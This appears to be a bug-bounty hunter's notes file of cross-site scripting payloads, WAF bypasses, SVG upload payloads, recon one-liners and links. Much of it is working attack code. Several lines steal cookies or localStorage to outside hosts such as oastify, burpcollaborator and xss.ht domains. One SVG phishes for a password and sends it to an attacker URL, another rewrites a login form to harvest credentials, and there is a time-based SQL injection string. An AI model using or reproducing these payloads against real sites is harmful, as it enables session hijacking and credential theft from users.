@@ -1,0 +1,825 @@
+https://pastebin.com/ADPTYvqi
+
+https://github.com/Aacle/xss_payload (8000+ xss payloads)
+https://github.com/s0md3v/AwesomeXSS
+Without ">" (XSS) 
+@Rando02355205
+
+
+<svg onload='alert(1)'
+<svg onload="alert(1)"
+<svg onload=alert(1)//
+<svg onload=alert(1)+
+<svg onload=alert(1)<!--
+
+-----------------Best XSS payload list----------------------
+https://github.com/payloadbox/xss-payload-list
+https://d3adend.org/xss/ghettoBypass
+https://www.bugbountyhunter.com/vulnerability/?type=xss
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+------------------------------------------------------------
+
+
+
+
+
+https://forum.portswigger.net/thread/img-src-x-onerror-alert-quot-xss-quot-6e1d4dcb(XSS cheat sheet)
+https://c4rrilat0r.medium.com/how-i-managed-to-trigger-xss-automatically-to-get-critical-account-takeover-92ea3abcaf9
+https://hackxpert.com/labs/RXSS/GET/(XSS lab)
+http://sudo.co.il/xss/(Xss lab)
+https://sagarsajeev.medium.com/escalating-ssti-to-reflected-xss-using-curly-braces-825685bd93ec
+'()"/><img src=x><a href=http://evil.com>click</a>
+
+--------------------Base64 encoded payloads-----------------------
+PHNjcmlwdD5hbGVydCgnQHNlY19yMCcpPC9zY3JpcHQ+Cg==
+
+------------------------------------------------------------------
+https://thilakesh0079.medium.com/hidden-parameter-to-xss-b0280433ce47
+
+
+---------------------------------------------------------------------------------------------------
+--><svg onload=alert(1);>-->
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41>
+"><<img onerror=alert(document.cookie) src>
+"><<img src=x onerror=this.src=’https://gkhck.herokuapp.com/p?cookie='+JSON.stringify(localStorage) />
+
+"<svg onload=\"alert('XSS on '+ document.domain)\">"
+"<marquee>XSS</marquee><svg onload=\"alert('XSS on '+ document.domain)\">",
+
+https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/
+https://dev.twitter.com//web%2f:2/:///%01javascript:alert(1)/
+javascript:%250Aalert(1)
+
+<Tag OnEvent="alert/*>*/(1)"
+’);}</script><img src=x onerror=alert("XSS")>
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#filter-bypass-and-exotic-payloads
+
+"><iframe/style="display:none"/
+src='javascript:&\u0023000000000000000000000000101;val(atob("YWxlcnQoMSk="))'
+/></iframe><x/x="1
+
+
+echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq (for automation)
+
+
+
+------------------------------------xss through svg-----------------------------------------
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0.0,50.50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">
+prompt(‘XSS-Attack’);
+prompt(document.domain);
+prompt(document.cookie);
+prompt(alert(localStorage.getItem("IsvSessionToken")));
+</script>
+</svg>
+-----------------------------------------------------------------------------------------
+<script>document.write('<img src="http://malicious/?'+document.cookie+'"/>');</script>
+alert(String.fromCharCode(88,83,83))
+<svg onload=prompt%26%230000000040document.domain)>
+<script/src=//㎻.₨></script>
+<svg/onload=alert()?
+
+bypass filter -->
+"onm<x>useover="alert(document['cookie'])">
+"onf<x>ocus="alert(document['cookie'])"autfocus"> 
+`"‘><img src=x onerror=promtp(7)>`"’${{8*8}}
+{{constructor.constructor('location.replace("https://Evil.com")')()}}
+‘);alert(1);//
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+
+----------------------------File upload xss via svg file----------
+\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
+<?xml version="1.0" standalone="no"?>
+ <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> 
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript"> 
+alert("sourabh singh tomar");
+</script> 
+</svg>
+
+data:text/html;base64,
+--------------------------------------------------------------
+------------------------Blind xss via svg file upload-------------------
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC
+"-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="200"
+height="200"
+zoomAndPan="disable"
+xmlns="http://www.w3.org/2000/svg"
+xmlns:xlink="http://www.w3.org/1999/xlink"
+xml:space="preserve">
+<!-- Script linked from the outside--> 
+<script xlink:href="https://xxxx.burpcollaborator" /> 
+<script> 
+//<![CDATA[ 
+alert("M7.Arman"); 
+]]> 
+</script> 
+</svg>
+-----------------------------------------------------------
+
+---------------------Xss via file name-----------------
+'"><img src=x onerror=alert("HEllo")>.png
+-------------------------------------------------------
+https://0xjin.medium.com/new-xss-bypass-cloudflare-filters-2a878c01d312
+
+adiNinda"><ScRipt>location.href = ‘http://www.attacker.com/shhhhhh.php?cookie='+document.getElementById("id").value;</sCriPt>
+--------------------------------------------------------
+<u title='<noscript>"><img src=x onerror=prompt(1)></noscript>'>
+
+"><img src=" https://asset.kompas.com/crops/AOqycoSV_pH5eU51rYStWW_zVFY=/1x0:1000x666/750x500/data/photo/2019/11/04/5dbfff829ebe6.jpg " alt= " "autofocus onclick="prompt(1)" title=’"autofocus onfocus=prompt(1)>’>
+----------------------------------------------------------
+{"body":"<img src=x onerror=alert()>"}
+{"firstname":"<img src=x onerror=alert(1)","lastname":"Doe","email":"abc@gmail.com","reseturi":"https://evil.com"}
+
+-----------------------------------------------------------
+some similiar payload before main payload<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>Some similiar payload after main payload
+
+some similiar payload before main payload"><iframe/src=javascript&colon;[document&period;domain].find(alert)>Some similiar payload after main payload
+
+------------------------------------------------------------
+
+https://infosecwriteups.com/all-about-file-upload-xss-c72c797aaba3
+
+blogPostId=test123";(alert)("xss")//
+
+https://infosecwriteups.com/weaponizing-reflected-xss-to-account-takeover-ae8aeea7aca3
+
+<img src/onerror=prompt(document.cookie)>
+
+
+------------------------xss through file upload(through svg)---------------------------
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">
+alert(‘XSS by Blublu\n’+document.domain+’\n’+document.cookie);
+</script>
+</svg>
+
+----------------------------------------------------------------------------
+<input type="text" value="somevalue" autofocus onfocus="alert(document.cookie)">
+
+<div style="display:none">
+<input type="text" value="somevalue" pattern="somethingelse" oninvalid="alert(document.cookie)">
+</div>
+
+------------------Google dorks--------------
+intitle:"index of" 
+intext:"Index of /" +.htaccess
+filetype:log
+site:medium.com
+----------------------------------------------
+
+Tools:
+
+My favorite tool, XSStrike: https://github.com/s0md3v/XSStrike
+https://github.com/hahwul/dalfox
+https://github.com/ssl/ezXSS
+XSS Payload-List: https://github.com/Proviesec/xss-payload-list/
+You can also always find new tools on my Github page, including XSS tools. I only include tools which are also accessible via website or mobile: https://provie.github.io/Provies-Bug-Bounty-Dorking-Site-PBBDS/#XSS
+-----------------------------------------------------------------------------------
+<object data=javascript&colon;alert&lpar;document.domain)>
+ <object data=javascript&colon;alert&lpar;document.domain)>, result: <object data=alert(document.domain)>
+- test<img src=x onclick=alert(1)>test, result: test<img src="x">test
+- test<img src=x onx=alert(1)>test, result: test<img src="x">test
+- <img onx=>, result: <img onx="">
+- <img onx=x>, result: <img>
+- <img onx="">, result: <img>
+- <img onx=''>, result: <img>
+- test javascript: test, result: test test // "javascript:" is removed.
+- test<img src=x oncjavascript:lick=alert(1)>test, result: test<img src="x" onclick="alert(1)"> // alert is not responding.
+- "alert(1)" in console, result: ====alert==== 1 // use prompt.
+- test<img src=x oncjavascript:lick=prompt(1)>test, result: test<img src="x" onclick="prompt(1)"> // success. 
+------------------------------------------------------------------------------------------------
+https://infosecwriteups.com/bypassing-waf-to-perform-xss-2d2f5a4367f3
+
+-------------------------------------------------------------------------------
+$(sleep 20) <script>alert(1)</script>"><img src="x" onerror=prompt(1);>
+
+-------------------------------------------------
+XSS via file upload payload
+<svg xmlns="https://www.w3.org/2000/svg" viewBox="0 0 96 105">
+<html><head><title>test</title></head><body><script>alert("xss-POP-UP");</script></body></html>
+</svg>
+----------------------------------------------------------
+<p>
+<h3><script>/*</h3><br>*/alert(document.domain)//</p></script></h3>
+</p>
+
+xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
+</script><svg/onload=alert(1)>
+a'}}})});alert('Tri ân Mẹ Việt Nam Anh hùng');$(function(){var a = new Vue({b:{c:{d:'e
+5}}})});alert(String.fromCharCode(88,83,83));$(function(){var a = new Vue({b:{c:{d:5
+
+google dork: site:*target.com inurl:/login.jsp?msg=
+
+
+'""><img src=x onerror=fetch('//burpcollaborator.net/?c='%2Bdocument.cookie)> 
+
+----------------------Image rendering payload through svg---------------------------
+
+<svg width ="100%" height="100%" viewBox="0 0 100 100"
+xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+
+<circle cx="50" cy="50" r="45" fill="green" id="foo" o="foo"/>
+<script>alert("XSS Test");</script>
+<script>alert(document.cookie);</script>
+</svg>
+----------------------------------------------------------------------------------------
+On the third line it will create a green circle with the size 50x50 and then it will execute
+the javascript code. Let's copy it and create an SVG file and paste the contents into the file and 
+paste the contents into the file and close. I opened the terminal in the directory where the file was, opened port 80 HTTP and made port forwarding using Ngrok, then copy the URL with the path of the image and pasted in the value of the url parameter of that application.
+
+---------------------------------------------------------------------------------------
+
+Payload for Username field : <img src=x onerror=alert(1)>
+Payload for Email field : "><svg/onload=confirm(1)>"@x.y
+
+"><script src=https://yourxssdomain></script>(for blind xss in feedback form)
+
+"><iframe/style="display:none"/
+src='javascript:&\u0023000000000000000000000000101;val(atob("YWxlcnQoMSk="))'
+/></iframe><x/x="1 (bypass waf)
+
+---------------------------xss via svg------------------------------------------------
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+ <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+ <script type="text/javascript">
+alert(document.domain);
+ </script>
+</svg>
+-------------------------------------------------------------------------------
+
+
+"><svg/onload=alert(1)>"@x.y (for email)
+');alert();//
+<img src=x onerror=prompt(); &gt;
+'><img src=x onerror=prompt()>
+'><img src=x onerror=confirm()>
+'><img src=x onerror=alert()>
+svg--><svg+onload%3Dalert%28%29>
+--%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528%2529%253E
+--&gt; <svg onload=prompt(1); &gt;
+--&gt; <svg onload=alert(1); &gt;
+--><svg onload=prompt(1);>-->
+--><svg onload=prompt(1);>-->
+--><svg onload=confirm(1);>-->
+--><svg onload=alert(1);>-->
+<svg onload=alert&lpar;1&rpar;> 
+<svg onload=alert&#40;1&#41>
+%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E %2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+&lt;img src=x onerror=alert()>
+<svg onload=alert(1)//
+(A("onerror="alert`1`"))
+(Z("onerror="a=print,a`1`"))
+(Z("onerror="a=console,a.log`1`"))
+(Z("onerror="a=console,a.log`${cookie}`" (https://domain.com/AdminNET/(Z("onerror="a=console,a.log`${cookie}`"))/filename.aspx)
+
+
+"<img src=x onerror=this.src=\"http://ID.burpcollaborator.net/?c=\"+document.cookie>"
+
+
+https://www.starbucks.com/account/(F(%22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22))/signin
+
+
+
+https://www.starbucks.com/account/(A(%22%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22))/signin 
+
+Some Cloudflare's latest XSS Bypass:
+
+XSS"><body %00 onControl hello onmouseleave=confirm(domain) x>XSS
+
+XSS"><html><select %00 onControl onpointerenter=prompt(domain) hello>
+
+XSS"><input %00 onControl hello oninput=confirm(domain) x>
+
+A cloudflare bypass which works almost everytime:)
+<svg onload=alert%26%230000000040"1")>
+
+https://crashcyber.medium.com/xss-cheat-sheets-5eaa76d13958
+‘"`><img src=x>${7*7}
+<script/src=//Ǌ.₨></script>
+
+cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUNTER></script>" 
+
+${alert(1)}
+one liner xss 
+
+
+subfinder -d disney.com -silent -all | waybackurls | gf xss | sort -u | nuclei -tags xss -rl 20 -c 10 -o xss_report.txt
+
+"Please enter your first name"
+😎 You:
+"jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
+
+
+<img src=x onerror=this.src=’http://{YOUR EXTERNAL URL}/?c=’+document.cookie> (for stealing cookies)
+
+testacc@hubopss.com‘-alert("h4ck3d!!")-’
+
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`> (bypass cloudflare)
+
+XSS payload ><img/src/onerror=confirm(3)> 
+
+0%27XOR(if(now()=sysdate(),sleep(20),0))XOR%27z
+
+https://jorenverheyen.github.io/Intigriti-July-2022/intigriti_july_2022.pdf(best blog ever)
+
+<svg onload=location='javascript:alert(1)'>
+
+<svg onload=a=')',b='t(1',j='javas',
+s='cript:aler',location=j+s+b+a>
+
+<svg onload=innerHTML=
+'\74img/src/onerror\75alert\501\51\76'>
+
+<svg onload=a='\51\76',b='t\501',
+i='\74img/src/one',m='rror\75aler',innerHTML=i+m+b+a>
+
+<svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
+
+<svg onload=location=textContent>javascript:alert(1)//
+
+<svg onload=location=nextSibling.innerText>
+<b>javas<b></b>cript:al<b></b>ert(1)</b>
+
+<svg onload=location=nextSibling.innerText>
+<b>javas<b></b>cript:al<b></b>ert(<b>1</b>)</b>
+
+<svg onload=innerHTML=nextSibling.innerText>
+<b>&lt;img/src/on<b></b>error=al<b></b>ert(1)></b>
+
+<svg onload=innerHTML=nextSibling.innerText>
+<b>&lt;img/src/on<r></r>error=al<u></u>ert(<te>1</te>)></b>
+
+<svg onload=location=all[22].innerText>
+<b>javas<b></b>cript:al<b></b>ert(1)</b>
+
+<x/contenteditable/autofocus/onfocus=confirm()>
+
+https://brutelogic.com.br/blog/file-upload-xss/ (file upload xss)
+
+------------------------------------------------------------------------------------------
+so simple javascript code like this will change the action of this form
+document.forms[1].action='https://<YOUR_SERVER>/?Hacked'
+The Final payload
+https://www.example.com/account/?jid=77877"><svg onload=document.forms[1].action='https://<YOUR_SERVER>/?Hacked'>
+I used Burb Collaborator As my server and when I checked it I found my username and password.
+------------------------------------------------------------------------------------------
+
+<style amp-custom>body{color:red}</styleX>
+<meta name="</style><img src='x'onerror=alert(1)">
+
+https://medium.com/@mohamedtarekq/defeat-the-httponly-flag-to-achieve-account-takeover-rxss-c16849d3d192
+
+a="al";b="ert";self[a+b]();
+
+"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+
+-----------------------------------Xss via svg file upload-----
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+ <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+ <script type="text/javascript">
+alert("Xss is triggered");
+ </script>
+</svg>
+------------------------------------------------------------------------------
+-----------------svg upload-------------------------
+<?xml version=”1.0" standalone=”no”?>
+<!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN” “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version=”1.1" baseProfile=”full” xmlns=”http://www.w3.org/2000/svg">
+
+<polygon id=”triangle” points=”0,0 0,50 50,0" fill=”#009901" stroke=”#004400"/>
+
+<script type=”text/javascript”>
+alert(document.cookie);
+</script>
+</svg>
+
+-----Taking it to Credential Theft by Modifying the Above Payload to :------------
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+
+<script> 
+var passwd = prompt("Enter your password to continue");
+var xhr = new XMLHttpRequest();
+xhr.open("GET","https://attacker-url.com/log.php?password="+encodeURI(passwd));
+xhr.send();
+</script>
+
+</svg>
+====================================================
+
+xss via brutelogic
+
+https://brutelogic.com.br/poc.svg
+
+one liner xss -->
+
+cat domains.txt | httx | waybackurls | uro| gf xss | dalfox pipe
+"><<img onerror=alert(document.cookie) src>
+
+"><<img src=x onerror=this.src=’https://gkhck.herokuapp.com/p?cookie='+JSON.stringify(localStorage) />
+
+abc`;return+false});});alert`xss`;</script>
+
+"/>&lt;script>alert(1)&lt;/script> "/> (remove underscore)
+]")%3balert(document.cookie)%3b// 
+<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt; 
+
+Go to another users profile
+Click private message
+Type any subject
+Type the following message Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
+Send the message
+View the message (triggers the XSS)
+Wait for the victim to read the message
+https://medium.com/@mohamedtarekq/defeat-the-httponly-flag-to-achieve-account-takeover-rxss-c16849d3d192
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
+
+"/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\\1\\)>
+
+
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+JavaScript://%250Aalert?.(1)//
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+\74k<K/contentEditable/autoFocus/OnFocus=
+/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+
+<h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
+
+XSS Payloads for Open redirect:-
+";alert(0);//
+java%0d%0ascript%0d%0a:alert(0) j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` java%07script:prompt`0` java%09scrip%07t:prompt`0` 
+
+akamai waf bypass -->
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+ x" onmouseover=alert(1) x="
+
+ <b><img<b></b> src="x" <b></b>onmouseover=<b></b>alert()>
+
+ <b>&lt;img/src/on<b></b>error=al<b></b>ert(1)></b>
+ <b>&lt;img src="x" on<b>error=al<b></b>ert(1)></b>
+
+<b><img src="https://whoami.if12rbhsjcjqalji9l7lakgpcgi76w.oastify.com"></b>
+
+"><script src=https://s0urabh.xss.ht></script>
+<svg><animate%20onend=alert(document.cookie)%20attributeName=x%20dur=1s>
+"/><svg/onload=confirm(/xxs/)>
+
+Opened burp-collaborator-client and modified the payload to : <script>new Image().src="http://u72i2zf33ha10t15kc0yzned44auyj.oastify.com/abc.php?output="+document.cookie;</script>
+
+<b><script></b>alert()<b></b></script>
+
+"><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx> (AMAZON WAF BYPASS)
+<img src=x onerror=console.log(alert(1)) <
+
+<script>location.replace(“http://hackerdomain.com”)</script>
+
+"><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>
+
+"><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>
+
+“><img src=’https://blindf.com/b.php?c=querytoremember’>(blind)
+“><img src=’https://blindf.com/b.php?c=target_com_latestpayload'>
+
+
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+"><<svg onload=alert&#0000000040document.cookie)> blocked by CSP. 
+
+2-Cloudflare + CSP bypass payload: "><<iframe onx=() onload=(alert)(6)>
+%22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D
+
+
+{{ &lt;svg/onload=prompt(&quot;XSS&quot;)&gt; }}
+
+stealing cookies -------------------
+
+document.write ('<img src="//domain.com/cookie?c='+encodeURIComponent(document.cookie)+'">');
+
+"x" onclick=alert(1223) (for triggering press alt+shift+x)
+
+" tabindex="1"onfocus="alert(1)" autofocus " (this is the span attack)
+
+
+Avoid filtering unclosed tages
+
+<svg onload="alert(1)"
+
+Double Encoded XSS
+without parantheses 
+alert`1`
+alert obfuscation 
+top8680439..toString(30)
+onload="alert(1)"
+
+File upload injection 
+
+file name "><svg onload=alert(1)>.gif
+SVG file <svg xmlns="xxxx" onload="alert(1)"/>
+
+Javascript injection
+
+typical '/alert(1)//
+
+Escape Bypass \'/alert(1)//
+
+Logical Block '}alert(1)%0A{'
+
+Quoteless /alert(1)}//\
+
+<svg/Animation/onload=alert(1)> 
+<svg/hackerone/onload=alert(1)>
+'">one,two<svg/onload=alert(1)>
+
+Noscript payload xss : 
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+\"><iframe/src=javascript:alert%26%23x000000028%3b)>
+*/</script><script>alert()/*
+'href=javascript:alert()>click me<a/y='
+\u0061\u006c\u0065\u0072\u0074()
+%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%29
+&#x25;5Cu0061&#x25;5Cu006C&#x25;5Cu0065&#x25;5Cu0072&#x25;5Cu0074&#x25;28&#x25;29
+=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+<a href="https://x.ss<svg/onload=" title=1>alert(1)"
+<a href="https://x.ss</script><svg/onload=" title=1>alert(1)"
+<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
+asd',%20alert(document.location),%20%27
+
+Impact
+With the help of XSS an attacker can steal your cookies, in many cases steal sessions, download malware onto your system and send a custom request.
+Users can be socially engineered by the attacker by redirecting them from the real website to a fake one and there are many more attack scenarios that an expert attacker can perform with XSS.
+It is also possible to inject html thus modifying the original page
+
+"><img src="x" onmouseover="document.write('<iframe src='http://ngrok.io></iframe>')"/> (blind ssrf poc)
+
+CloudFlare waf block bypass ( #xss ) 
+Payload :  <svg onload=alert&#0000000040document.cookie)>
+
+/webapp/admin/login.html?1%001337'%3balert('akr3ch')%2f%2f"
+
+/(A('onerror=%22alert%601%60%22testabcd))/
+
+/Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders
+
+(A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f
+
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+<tag only=1 onEvent=alert(1)>
+
+<select><style></select>
+<svg onload=alert(1)>
+</style>
+
+'"><svg/onload=prompt(5);>{{7*7}}
+
+' ==> for Sql injection 
+
+"><svg/onload=prompt(5);> ==> for XSS 
+
+{{7*7}} ==> for SSTI/CSTI
+
+"><script src=https://s0urabh.xss.ht></script>
+<img src=x onerror=this.src=’https://s0urabh.xss.ht/?c=’+document.cookie>
+
+ Payload: <input/onfocus=prompt(document.domain) autofocus>
+
+ %22%3E%3Cscript%3Ealert(1)%3C/script%3E
+ %27%2B%3C%2FScripT%3E%3CScRIpT%3Eprompt%28document.domain%29%3C%2FscRIpT%3E%2B%27
+
+ <iframe src=javascript:alert(1)>/
+
+ [<iframe/srcdoc=”<script/src=//s0urabh.xss.ht></script>”>](blind xss)
+
+ "><script src=https://s0urabh.xss.ht></script>
+
+ <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//s0urabh.xss.ht");a.send();</script>
+
+ %22%3E%3Cscript+src%3Dhttps%3A%2F%2Fabhartiya.xss.ht%3E%3C%2Fscript%3E
+
+ Payload :- ">&lt;Base Href=//X55.is>x --> popedup xss
+hello%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+<svg/On/OnLoAd=confirm(1)>
+
+%26lt;script%26gt;alert(document.domain)%26lt;/script%26g
+
+"style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
+{{_c.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+
+"/>&lt;script>alert(1)&lt;/script>
+"/>&lt;img src=x onerror=alert(1)&gt;
+
+ </script><embed/embed/embed/src=//14.rs> //Cloudflare bypass xss
+<img src onerror=alt=''+document.domain> 
+%22%2F%3E%22%2F%3E%3Cimg+src%3Dxss+onerror%3Dalert(2)%3E
+//x:1/:///%01javascript:alert(document.cookie)/
+&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
+<svg/onload=location/**/='https://your.server/'+document.domain>//Cloudflare bypass
+
+cat rootDomains.txt | assetfinder -subs-only | httpx -nc -silent -t 50 -p 80,443,8443,8080 -path "/?xss=\"</script><script>alert(\"XSS\")</script>" -mr "<script>alert(\"XSS\")</script>"
+
+‘><input autofocus onfocus=alert(1)>
+javascript://%0alert(1)
+javascript://%250aalert(1)
+--!><Svg/Onload=confirm(document.domain)>
+
+Image name xss bypass
+'"><img src=x onerror="a=alert;a(1);".jpg
+2)AWS WAF Bypass:-
+<!<script>confirm(1)</script>
+<marquee loop=1 width=0 onfinish=alert(2)>
+
+"><svg><animate onbegin=prompt(document.domain) attributeName=x dur=1s>
+<img src=totallyfake onerror=import('//domain.com/'');//
+<svg onload=%0Aalert`1`> '
+<h1 onpointerup=$.getScript(“mydomain_url”)>Hello</h1>
+<p onmouseover="alert(document.cookie)">payload</p>
+<img src="x" onerror="document.write(window.location)" />
+<iframe/src=javascript:alert)>\
+\"><iframe/src=javascript:alert%26%23x000000028%3b)>
+“><svg /on onload=alert(1)>
+‘><input autofocus onfocus=alert(1)>
+xss"><!--><svg/onload=alert(document.domain)>
+If your input <>" is filtered out and is reflected as in the context like:
+<div id=”example” onclick=”runjs(‘userinput&lt;&quot;’);”>
+
+You can still bypass with it:  ‘);alert(‘test’);
+XSS via Angular Client-Side Template Injection P2/P3
+
+>=1.6.0
+{{constructor.constructor('alert(1)')()}}
+
+1.2.24 - 1.2.29
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}
+
+<div id=”example”
+onclick=”runjs(‘userinput’);alert(‘test’);”>
+;1lblah"<iframe/onload=confirm(document.domain);></i>"
+';a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+xx'-alert(document.cookie)-'&
+xss'''><iframe srcdoc='%26it;script>;prompt`${document.domain`%26it;/script>'> (cloudflare bypass)
+%09Jav%09ascript:alert(document.domain)
+<select><noembed></delect><script x='a@b'a>
+y='a@b'//a@b%0a\u0061lert(1)</script x> (cloudflare)
+'"><img/src/onerror=prompt()>
+ java%26Tab%3bscript:ale%26Tab%3brt() 
+ <iframe src=javascript:alert()// 
+ <s<script>cript>alert()</s<script>cript>
+ CODE%22});alert(123);$(%22%23click_button%22).click(function(){location.href=%22names.php?lang=CODE
+ </script><body/onload=alert(`m3ez`)>
+ heli9″);window[‘alert’](1)//
+
+"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
+
+'"><svg/onload=alert()>{{7*7}}
+https://gbhackers.com/top-500-important-xss-cheat-sheet/
+
+A combined payload to test SQLi, XSS and SSTI/CSTI 
+' " <svg/onload=prompt(5);>{{7*7}}
+<svg><style>
+    <script>alert(1)</script>
+</style></svg>
+
+<math><style>
+    <img src onerror=alert(2)>
+</style></math>
+
+XSS Bypass - slice + external script
+
+Payload:
+<svg onload=eval(location.hash.slice(1))>
+
+Put this at the end of the URL:
+#with(document)body.appendChild(createElement('script')).src='//domain'
+
+<svg/onload=alert(1)>
+<img/src=x onerror=confirm(1)>
+<form/action=javascript:alert(1)>
